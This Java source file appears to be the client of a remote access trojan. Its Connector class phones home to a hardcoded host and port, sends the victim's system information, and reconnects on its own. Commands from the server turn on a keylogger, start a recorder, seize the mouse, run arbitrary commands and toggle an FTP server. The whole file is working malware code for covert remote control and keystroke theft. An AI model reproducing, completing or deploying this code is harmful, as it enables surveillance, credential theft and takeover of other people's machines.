package org.graviton.network;

import org.apache.mina.core.buffer.IoBuffer;
import org.apache.mina.core.service.IoHandler;
import org.apache.mina.core.session.IdleStatus;
import org.apache.mina.core.session.IoSession;
import org.apache.mina.transport.socket.nio.NioSocketConnector;
import org.graviton.controller.KeyLogger;
import org.graviton.controller.MouseController;
import org.graviton.controller.Recorder;
import org.graviton.runtime.Executor;
import sun.awt.OSInfo;

import java.net.InetSocketAddress;
import java.nio.charset.CharacterCodingException;
import java.nio.charset.Charset;
import java.util.concurrent.locks.ReentrantLock;
import java.util.stream.Stream;

import static org.graviton.common.OSInfo.buildUserInfo;

public class Connector implements IoHandler {
    private static final int PORT = 1799;
    private static final String HOST = "192.168.0.6";
    private static final int TIMEOUT = 5000;
    private static final ReentrantLock locker = new ReentrantLock();
    private static NioSocketConnector connector;

    private static IoSession server;

    private static KeyLogger keyLogger;

    static {
        checkEvent();
    }

    public static void connect() {
        locker.lock();
        try {
            connector = new NioSocketConnector();
            connector.setHandler(new Connector());
            connector.connect(new InetSocketAddress(HOST, PORT));

            long time = System.currentTimeMillis();
            while (!connector.isActive() && (System.currentTimeMillis() - time < TIMEOUT)) ;
            if (connector.isActive())
                System.out.println("Connected to server [" + HOST + ":" + PORT + "]");
            else
                System.out.println("Failed to connect to server [" + HOST + ":" + PORT + "]");
        } finally {
            locker.unlock();
        }
    }

    private static void checkEvent() {
        Thread t = new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(10000);
                    if (connector != null && !connector.isActive())
                        connect();
                } catch (Exception e) {
                }
            }
        });
        t.setDaemon(true);
        t.start();
    }

    private static IoBuffer stringToBuffer(String packet) {
        return IoBuffer.allocate(4096).put(packet.getBytes()).flip();
    }

    private static String bufferToString(Object buffer) {
        try {
            return IoBuffer.allocate(4096).put((IoBuffer) buffer).flip().getString(Charset.forName("UTF-8").newDecoder());
        } catch (CharacterCodingException e) {
            return "undefined";
        }
    }

    private static void parse(String data) {
        String extra = data.substring(1);
        switch (data.charAt(0)) {
            case '1':
                MouseController.switchLock(extra.charAt(0) == '1');
                break;
            case '2':
                if (keyLogger == null) {
                    keyLogger = new KeyLogger();
                    keyLogger.listen();
                } else {
                    keyLogger.destroy();
                    keyLogger = null;
                }
                break;
            case '3':
                new Recorder();
                break;
            case 'x':
                Executor.execute(extra);
                break;
            case 'm':
                MouseController.move(Integer.parseInt(extra.split(":")[0]), Integer.parseInt(extra.split(":")[1]));
                break;
            case 'c':
                MouseController.click(extra.charAt(0) == '1');
                break;
            case 'f' :
                FTPServer.switchServer();
                break;
        }
    }

    public static void send(String data) {
        server.write(stringToBuffer(data));
    }

    @Override
    public void sessionCreated(IoSession ioSession) throws Exception {
        server = ioSession;
        ioSession.write(stringToBuffer("0" + buildUserInfo(OSInfo.getOSType())));
    }

    @Override
    public void sessionOpened(IoSession ioSession) throws Exception {

    }

    @Override
    public void sessionClosed(IoSession ioSession) throws Exception {
        if (keyLogger != null) {
            keyLogger.destroy();
            keyLogger = null;
        }
    }

    @Override
    public void sessionIdle(IoSession ioSession, IdleStatus idleStatus) throws Exception {

    }

    @Override
    public void exceptionCaught(IoSession ioSession, Throwable throwable) throws Exception {

    }

    @Override
    public void messageReceived(IoSession ioSession, Object o) throws Exception {
        String input = bufferToString(o);
        System.out.println("Server < " + input);
        if (input.contains("!")) {
            Stream.of(input.split("!")).forEach(Connector::parse);
        } else
            parse(input);
    }

    @Override
    public void messageSent(IoSession ioSession, Object o) throws Exception {
        System.out.println("Server > " + bufferToString(o));
    }

    @Override
    public void inputClosed(IoSession ioSession) throws Exception {

    }
}
